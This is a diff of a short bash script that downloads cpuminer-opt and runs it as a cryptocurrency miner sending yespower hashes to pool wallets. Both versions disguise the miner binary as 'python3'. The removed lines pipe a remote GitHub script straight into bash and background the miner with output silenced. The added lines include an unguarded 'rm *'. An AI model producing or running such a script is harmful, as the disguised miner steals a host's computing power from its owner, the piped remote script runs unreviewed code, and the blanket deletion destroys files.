@@ -1,13 +1,18 @@
-#!/bin/bash
 
-bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"
+apt install screen -y
 
-clear
+wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
 
-echo "sedang menjalankan..."
+tar -xzf dot
 
-nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &
+rm dot
 
-clear
+mv cpuminer-sse2 python3
 
-echo "sukses berjalan cok..."
+mv python3 ~/
+
+rm *
+
+cd ~/
+
+screen ./python3 -a yespower -o yespower.asia.mine.zergpool.com:6533 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,mc=QCH,m=solo
